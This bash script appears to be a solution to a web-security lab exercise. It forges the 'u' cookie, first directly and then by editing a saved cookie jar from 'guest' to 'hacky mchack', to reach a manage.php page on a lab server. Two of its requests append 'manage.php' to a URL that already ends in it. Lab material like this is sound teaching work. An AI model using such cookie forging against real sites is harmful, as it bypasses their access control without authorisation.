#! /bin/bash

PORT=8010

if [[ $1 == "local" ]]; then
    remote="http://localhost:$PORT/manage.php"
else
    remote="http://141.85.224.102:$PORT/manage.php"
fi

echo "First Bash solution: set the cookie manually"

curl -s -b 'u=hacky mchack' "$remote"/manage.php

echo -e "\n----------------------------------------------------"

echo -e "\nSecond Bash solution: use a cookie jar"

# Save the cookie in the `cookies.txt` jar.
curl -s -c cookies.txt "$remote" > /dev/null

# Modify the cookie's value.
sed -i s/guest/hacky\ mchack/ cookies.txt

# Send a request with the modified cookie to `/manage.php`.
curl -s -b cookies.txt "$remote"/manage.php

echo -e "\n----------------------------------------------------"
